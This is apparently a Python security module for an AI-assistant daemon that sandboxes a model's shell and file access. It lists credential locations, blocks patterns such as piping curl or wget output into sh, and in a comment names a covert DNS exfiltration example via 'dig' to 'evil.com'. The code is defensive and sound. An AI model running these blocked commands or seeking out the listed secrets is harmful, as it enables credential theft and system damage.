"""Everything that stands between a model and the machine: the daemon token,
rate limiting, the file-read policy, the run_bash sandbox and the
allow-pattern / pending-confirmation bookkeeping."""

import fnmatch
import json
import os
import re
import secrets
import shlex
import subprocess
import threading
import time

from fastapi import Request

from .config import HOME, PERMISSIONS_FILE, TOKEN_FILE, rt

# ══════════════════════════════════════════════════════════════════════
# Daemon token
# ══════════════════════════════════════════════════════════════════════

def _load_token() -> str:
    try:
        if os.path.exists(TOKEN_FILE):
            with open(TOKEN_FILE, "r", encoding="utf-8") as f:
                return f.read().strip()
    except OSError:
        pass
    return ""


def ensure_token_file() -> None:
    """Generate a random daemon token on first start, stored with 0600 perms."""
    try:
        os.makedirs(os.path.dirname(TOKEN_FILE), exist_ok=True)
        if not os.path.exists(TOKEN_FILE) or os.path.getsize(TOKEN_FILE) == 0:
            with open(TOKEN_FILE, "w", encoding="utf-8") as f:
                f.write(secrets.token_urlsafe(32))
        os.chmod(TOKEN_FILE, 0o600)
    except OSError:
        pass


_DAEMON_TOKEN = ""


def daemon_token() -> str:
    """The expected token; re-read lazily so a rotated file is picked up."""
    global _DAEMON_TOKEN
    if not _DAEMON_TOKEN:
        _DAEMON_TOKEN = _load_token()
    return _DAEMON_TOKEN


def authorize(request: Request) -> bool:
    """True if the request carries the correct X-Prism-Token header.

    compare_digest() raises TypeError for non-ASCII str operands, so the
    comparison is done on UTF-8 bytes: constant time, defined for any input.
    """
    supplied = request.headers.get("X-Prism-Token", "")
    expected = daemon_token()
    if not expected:
        return False
    try:
        return secrets.compare_digest(supplied.encode("utf-8"), expected.encode("utf-8"))
    except (UnicodeEncodeError, TypeError, AttributeError):
        return False


# ══════════════════════════════════════════════════════════════════════
# Redaction
# ══════════════════════════════════════════════════════════════════════

_QUERY_KEY_RE = re.compile(r"([?&]key=)[^&\s\"']+")


def redact(text) -> str:
    """Strip API keys and the daemon token out of anything that may be logged,
    stored or shown: the worker proxy carries the Gemini key as `?key=` in the
    URL, and `requests` exceptions embed the full URL in their message."""
    text = "" if text is None else str(text)
    if not text:
        return text
    for key in rt.keys.values():
        if isinstance(key, str) and len(key) > 8:
            text = text.replace(key, "[REDACTED_API_KEY]")
    token = daemon_token()
    if token:
        text = text.replace(token, "[REDACTED_DAEMON_TOKEN]")
    return _QUERY_KEY_RE.sub(r"\1[REDACTED]", text)


# ══════════════════════════════════════════════════════════════════════
# Rate limiting (in-memory, per client address, /chat only)
# ══════════════════════════════════════════════════════════════════════

RATE_LIMIT_WINDOW = 60      # seconds
RATE_LIMIT_MAX = 10         # max requests per window per client
RATE_LIMIT_PRUNE_AT = 64    # only sweep the table once it is worth sweeping
_rate_limiter = {}          # client -> [hits, window_start]
_rate_lock = threading.Lock()


def _prune_rate_limiter(now: float) -> None:
    """Drop clients whose window has fully elapsed. Caller holds _rate_lock."""
    if len(_rate_limiter) < RATE_LIMIT_PRUNE_AT:
        return
    for c in [c for c, v in _rate_limiter.items() if now - v[1] > RATE_LIMIT_WINDOW]:
        _rate_limiter.pop(c, None)


def rate_limited(request: Request) -> bool:
    """True if the client exceeded the chat request rate.

    The window start is not refreshed on each hit: doing so let a client that
    kept retrying while throttled never age out of the window.
    """
    client = request.client.host if request.client else "unknown"
    now = time.time()
    with _rate_lock:
        _prune_rate_limiter(now)
        cur = _rate_limiter.get(client)
        if not cur or now - cur[1] > RATE_LIMIT_WINDOW:
            _rate_limiter[client] = [1, now]
            return False
        cur[0] += 1
        return cur[0] > RATE_LIMIT_MAX


# ══════════════════════════════════════════════════════════════════════
# File access policy
# ══════════════════════════════════════════════════════════════════════

# Places under $HOME that hold credentials or session material. Neither
# /read_file nor a run_bash argument may point into them.
SENSITIVE_HOME_PATHS = (
    "~/.ssh", "~/.gnupg", "~/.pki", "~/.password-store",
    "~/.config/prism", "~/.local/share/prism", "~/.cache/prism",
    # Shell config / history that often contains tokens or secrets
    "~/.bashrc", "~/.zshrc", "~/.bash_profile", "~/.zprofile", "~/.bash_logout",
    "~/.zshenv", "~/.bash_history", "~/.zsh_history", "~/.profile",
    "~/.netrc", "~/.pgpass", "~/.git-credentials",
    # Cloud / package credentials
    "~/.aws", "~/.config/gcloud", "~/.docker", "~/.kube", "~/.config/gh",
    "~/.local/share/keyrings",
    # Browser profiles and messengers that hold session credentials
    "~/.config/google-chrome", "~/.config/mozilla", "~/.mozilla",
    "~/.config/chromium", "~/.config/BraveSoftware",
    "~/.config/discord", "~/.config/vesktop", "~/.config/Signal",
    "~/.local/share/TelegramDesktop",
    # Password managers, editors' secret stores, and this very assistant
    "~/.config/Bitwarden", "~/.config/1Password",
    "~/.config/Code", "~/.vscode", "~/.config/Cursor",
    "~/.claude", "~/.config/Claude",
)
SENSITIVE_SYSTEM_PATHS = ("/etc", "/boot", "/dev", "/proc", "/sys", "/run")

# File names that are secrets wherever they live.
SENSITIVE_NAME_PATTERNS = (
    ".env", ".env.*", "*.pem", "*.key", "*.p12", "*.pfx", "*.kdbx", "*.gpg",
    "id_rsa*", "id_ed25519*", "id_ecdsa*", "id_dsa*",
    ".netrc", ".pgpass", ".git-credentials", "credentials", "credentials.json",
)

READ_FILE_MAX_BYTES = 25 * 1024 * 1024


def _resolved(path: str) -> str:
    return os.path.realpath(os.path.expanduser(path))


def _under(path: str, root: str) -> bool:
    return path == root or path.startswith(root + os.sep)


def is_sensitive_path(real_path: str) -> bool:
    """True when a fully-resolved path is, or lies inside, protected material."""
    for banned in SENSITIVE_HOME_PATHS:
        if _under(real_path, _resolved(banned)):
            return True
    name = os.path.basename(real_path)
    return any(fnmatch.fnmatch(name, pat) for pat in SENSITIVE_NAME_PATTERNS)


def allowed_read_path(path):
    """Resolve a client-supplied path for /read_file, or None if refused.

    The whole path is resolved with realpath() — leaf and every parent — so a
    symlink anywhere in it cannot escape $HOME or reach protected material.
    """
    if not path or not isinstance(path, str):
        return None
    try:
        real_home = os.path.realpath(HOME)
        real_path = os.path.realpath(path)
        if not _under(real_path, real_home):
            return None
        if any(_under(real_path, b) for b in SENSITIVE_SYSTEM_PATHS):
            return None
        if is_sensitive_path(real_path):
            return None
        return real_path
    except (OSError, ValueError):
        return None


# ══════════════════════════════════════════════════════════════════════
# run_bash sandbox
# ══════════════════════════════════════════════════════════════════════

# SECURITY MODEL: commands run with shell=False, so shell metacharacters
# (|, ;, $(), >, backticks) are inert — they become literal argv. The only
# remaining way to cause harm is an allowlisted BINARY that can itself execute
# code, write/delete files, or change permissions, so the allowlist is strictly
# read-only inspection. Deliberately excluded:
#   - code execution: git (-c alias/core.pager), interpreters, find (-exec)
#   - file write/overwrite: dd, tee, cp, mv, sort (-o), truncate, ln, mkdir,
#     touch, mktemp, archivers (extract anywhere), tree (-o)
#   - deletion: rm, rmdir; ownership: chmod, chown
ALLOWED_COMMANDS = {
    # filesystem inspection (read-only)
    "ls", "pwd", "stat", "file", "readlink", "du", "df", "wc",
    # text / data inspection
    "echo", "cut", "paste", "tr", "uniq", "nl", "rev", "fold", "expand",
    "unexpand", "pr", "strings", "od", "xxd", "hexdump", "diff", "cmp",
    "zipinfo", "base64", "jq", "md5sum", "sha256sum",
    # system info (read-only)
    "date", "whoami", "id", "uname", "free", "top", "ps", "test",
    "which", "whereis", "whatis", "type",
    # terminal (harmless without a tty)
    "clear", "tput", "stty",
    # network diagnostics
    "ping", "traceroute", "nslookup", "dig", "host", "whois",
    "ip", "ifconfig", "netstat", "ss",
}

# Commands that talk to the network. Each run is still one confirmation away,
# but they can never become a stored allow-pattern: `dig <encoded>.evil.com`
# under an auto-approved "dig *" would be a covert exfiltration channel.
NETWORK_EGRESS_COMMANDS = {"ping", "traceroute", "nslookup", "dig", "host", "whois"}

# Patterns that must never be auto-allowed — require per-use confirmation.
DANGEROUS_PATTERNS = [
    r"\brm\s+-rf\b", r"\brm\s+-fr\b", r"\bmkfs\b", r"\bdd\s+", r"\bsudo\b",
    r"\breboot\b", r"\bshutdown\b",
    r"\bcurl\b.*\|\s*(ba)?sh", r"\bwget\b.*\|\s*(ba)?sh",
    r".*\|\s*(ba)?sh\b", r"\b>\s*/etc\b", r"\b>\s*/boot\b",
    r"\bchmod\s+-R\s+777\b", r"\bmv\s+/\b", r"\bpasswd\b",
]

# Binaries that can execute code, write/overwrite/delete files, or change
# permissions. Already outside the allowlist; forced dangerous here too so
# that, should the allowlist ever widen, they can never be auto-approved or
# stored as a persistent allow-pattern.
WRITE_OR_EXEC_BINS = {
    "git", "dd", "tee", "cp", "mv", "rm", "rmdir", "mkdir", "touch", "mktemp",
    "ln", "sort", "truncate", "chmod", "chown", "chattr", "patch",
    "gzip", "gunzip", "bzip2", "bunzip2", "xz", "unxz", "zstd", "unzstd",
    "7z", "7za", "jar", "unzip", "tar", "cpio", "rsync", "install", "tree",
    "python", "python3", "node", "ruby", "perl", "php", "bash", "sh", "zsh",
    "find", "xargs", "env", "nohup", "awk", "gawk", "sed", "vi", "vim", "nano",
    "ex", "ed", "eval", "exec", "source",
}

_DANGEROUS_SUBSTRINGS = [
    "su ", "su\n", "su;", "su|",
    "pkexec", "visudo", "vipw", "vigr",
    "parted", "fdisk", "cfdisk",
    "mount ", "mount\n", "umount ",
    "iptables", "nft ", "ufw ",
    "systemctl ", "service ",
    "modprobe ", "insmod ", "rmmod ",
    "dd if=", "dd if=/", "dd of=/dev/",
    "mkfs.ext", "mkfs.xfs", "mkfs.btrfs",
    "truncate ", "chown ", "chmod ", "chattr ",
    "useradd ", "userdel ", "groupadd ", "groupdel ",
    "passwd ",
    "crontab ", "at ",
    "ansible-playbook", "terraform ",
    "/dev/shm/", "/proc/", "/sys/",
    "python -m http.server", "python3 -m http.server",
    "php -S ", "ruby -e ", "node -e ",
]

RUN_BASH_TIMEOUT = 30
# Tool output goes straight back into the model's context, and an unbounded
# read (`od /dev/zero`) would otherwise fill memory until the timeout.
RUN_BASH_MAX_OUTPUT = 64 * 1024


def command_binary(command: str) -> str:
    """Basename of the leading word of a command, lower-cased."""
    try:
        parts = shlex.split(command)
    except ValueError:
        parts = command.strip().split()
    return parts[0].split("/")[-1].lower() if parts else ""


def is_dangerous(command: str) -> bool:
    """Does the command need a fresh confirmation every time?

    Anything that can chain, substitute, redirect into system paths or run
    through a write-capable binary counts.
    """
    if not command:
        return False
    cmd = command.strip().lower()
    if command_binary(command) in WRITE_OR_EXEC_BINS:
        return True
    for pat in DANGEROUS_PATTERNS:
        if re.search(pat, cmd):
            return True
    if re.search(r"[;&|]", command):
        return True
    if "$(" in command or "`" in command or "<(" in command or ">(" in command:
        return True
    if re.search(r">>?\s*/(etc|boot)", command):
        return True
    if any(dc in cmd for dc in _DANGEROUS_SUBSTRINGS):
        return True
    if re.search(r"base64\s+(?:-d|--decode)", cmd):
        return True
    return False


def can_persist(command: str) -> bool:
    """May this command be saved as an "always allow" pattern?"""
    return not is_dangerous(command) and command_binary(command) not in NETWORK_EGRESS_COMMANDS


def _blocked_argument(args) -> str:
    """Return the first argument that points into protected material, or ''.

    Applies the /read_file policy to run_bash arguments: `base64 ~/.ssh/id_rsa`
    is as much a leak as reading the file through the API would be.
    """
    for raw in args[1:]:
        candidate = raw
        if raw.startswith("-"):
            if "=" not in raw:
                continue
            candidate = raw.split("=", 1)[1]  # --file=~/.ssh/id_rsa
        if not candidate:
            continue
        try:
            real = _resolved(candidate)
        except (OSError, ValueError):
            continue
        if is_sensitive_path(real):
            return raw
    return ""


def _run_capped(args, env, timeout: int, max_bytes: int):
    """Run argv, collecting at most max_bytes of stdout+stderr.

    Returns (stdout, stderr, truncated). The process is killed as soon as
    the budget is exhausted so a runaway producer cannot fill memory.
    """
    proc = subprocess.Popen(args, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                            stdin=subprocess.DEVNULL, env=env, shell=False)
    chunks = {"out": bytearray(), "err": bytearray()}
    truncated = {"flag": False}

    def pump(stream, key):
        while True:
            data = stream.read(8192)
            if not data:
                return
            budget = max_bytes - len(chunks["out"]) - len(chunks["err"])
            if budget <= 0:
                truncated["flag"] = True
                proc.kill()
                return
            chunks[key] += data[:budget]
            if len(data) > budget:
                truncated["flag"] = True
                proc.kill()
                return

    threads = [threading.Thread(target=pump, args=(proc.stdout, "out"), daemon=True),
               threading.Thread(target=pump, args=(proc.stderr, "err"), daemon=True)]
    for t in threads:
        t.start()
    try:
        proc.wait(timeout=timeout)
    except subprocess.TimeoutExpired:
        proc.kill()
        proc.wait()
        raise
    finally:
        for t in threads:
            t.join(timeout=2)
    return bytes(chunks["out"]), bytes(chunks["err"]), truncated["flag"]


def run_bash(command: str, env: dict) -> str:
    """Execute an allowlisted read-only command with shell=False."""
    try:
        try:
            args = shlex.split(command)
        except ValueError as e:
            return f"Command parsing error: {e}"
        if not args:
            return "Command is empty."
        binary = args[0].split("/")[-1].lower()
        if binary not in ALLOWED_COMMANDS:
            return f"Command '{args[0]}' is not in the allowed list."
        blocked = _blocked_argument(args)
        if blocked:
            return f"Access to '{blocked}' is blocked: it points at protected credentials or daemon state."

        out, err, truncated = _run_capped(args, env, RUN_BASH_TIMEOUT, RUN_BASH_MAX_OUTPUT)
        stdout = redact(out.decode("utf-8", errors="replace"))
        stderr = redact(err.decode("utf-8", errors="replace"))
        output = stdout + (f"\n[stderr]\n{stderr}" if stderr else "")
        if truncated:
            output += f"\n[output truncated at {RUN_BASH_MAX_OUTPUT // 1024} KB]"
        return output.strip() if output.strip() else "Command executed successfully."
    except subprocess.TimeoutExpired:
        return f"Command execution timed out after {RUN_BASH_TIMEOUT} seconds."
    except Exception as e:
        return f"Execution error: {redact(e)}"


# ══════════════════════════════════════════════════════════════════════
# Allow-patterns ("always allow") and pending confirmations
# ══════════════════════════════════════════════════════════════════════

def allowed_patterns() -> list:
    """Globally-allowed command patterns, re-read from disk on every call."""
    try:
        if os.path.exists(PERMISSIONS_FILE):
            with open(PERMISSIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
            rules = data if isinstance(data, list) else data.get("rules", []) if isinstance(data, dict) else []
            return [p.get("pattern", "") for p in rules
                    if isinstance(p, dict) and p.get("action") == "allow" and p.get("pattern")]
    except (OSError, ValueError):
        pass
    return []


def _save_allowed_patterns(patterns) -> None:
    try:
        os.makedirs(os.path.dirname(PERMISSIONS_FILE), exist_ok=True)
        with open(PERMISSIONS_FILE, "w", encoding="utf-8") as f:
            json.dump({"rules": [{"pattern": p, "action": "allow"} for p in patterns]}, f, indent=2)
        os.chmod(PERMISSIONS_FILE, 0o600)
    except OSError:
        pass


def matches_pattern(command: str, pattern: str) -> bool:
    """fnmatch-style check ('git *' matches 'git status' but not 'git status | rm -rf')."""
    p = (pattern or "").strip().lower()
    c = (command or "").strip().lower()
    if is_dangerous(command):
        return False
    if fnmatch.fnmatch(c, p):
        return True
    # 'cmd *' also allows the bare 'cmd'
    return p.endswith(" *") and c == p[:-2]


def command_ok_by_pattern(command: str) -> bool:
    """Does the command match a stored allow-pattern (and is it not dangerous)?"""
    if is_dangerous(command):
        return False
    return any(pat and matches_pattern(command, pat) for pat in allowed_patterns())


def grant_pattern(command: str) -> bool:
    """Persist an allow-pattern for a command (safe, non-network ones only).

    Simple commands are stored as their leading word plus a wildcard
    ("git status" -> "git *"); anything with shell metacharacters is stored
    verbatim so it only ever matches itself.
    """
    pat = (command or "").strip()
    if not pat or not can_persist(pat):
        return False
    if not re.search(r"[|>;&`$*?\[\]{}()\\]", pat):
        first = pat.split()[0][:64]
        pat = first + " *"
    patterns = allowed_patterns()
    if pat not in patterns:
        patterns.append(pat)
        _save_allowed_patterns(patterns)
    return True


def revoke_pattern(pattern: str) -> bool:
    """Drop a stored allow-pattern; False when it was not there."""
    patterns = allowed_patterns()
    if pattern not in patterns:
        return False
    _save_allowed_patterns([p for p in patterns if p != pattern])
    return True


PENDING_CONFIRM_TTL = 120   # seconds before an unanswered prompt counts as denied
PENDING_REAP_GRACE = 300    # seconds a resolved entry is kept so a late poll still reads it

# pending[tool_use_id] = {"ts": float, "resolved": None|"allow"|"deny"|"never",
#                          "command": str, "session_id": str, "provider": str, "model": str}
pending_confirm = {}
pending_lock = threading.Lock()


def expire_pending() -> None:
    """Deny timed-out confirmations, then reap ones nobody will read again."""
    now = time.time()
    with pending_lock:
        for k, v in list(pending_confirm.items()):
            ts = v.get("ts", 0)
            if v.get("resolved") is None:
                if now - ts > PENDING_CONFIRM_TTL:
                    v["resolved"] = "deny"
                    v["resolved_at"] = now
            elif now - v.get("resolved_at", ts) > PENDING_REAP_GRACE:
                pending_confirm.pop(k, None)


def register_pending(tool_id: str, command: str, session_id: str, provider: str, model: str) -> dict:
    """Park a tool call until the user decides; returns the client payload."""
    expire_pending()
    with pending_lock:
        pending_confirm[tool_id] = {
            "ts": time.time(), "resolved": None, "command": command,
            "session_id": session_id, "provider": provider, "model": model,
        }
    return {
        "pending": True,
        "tool_call_id": tool_id,
        "command": command,
        "dangerous": is_dangerous(command),
        "persistable": can_persist(command),
        "session_id": session_id,
        "provider": provider,
        "model": model,
    }
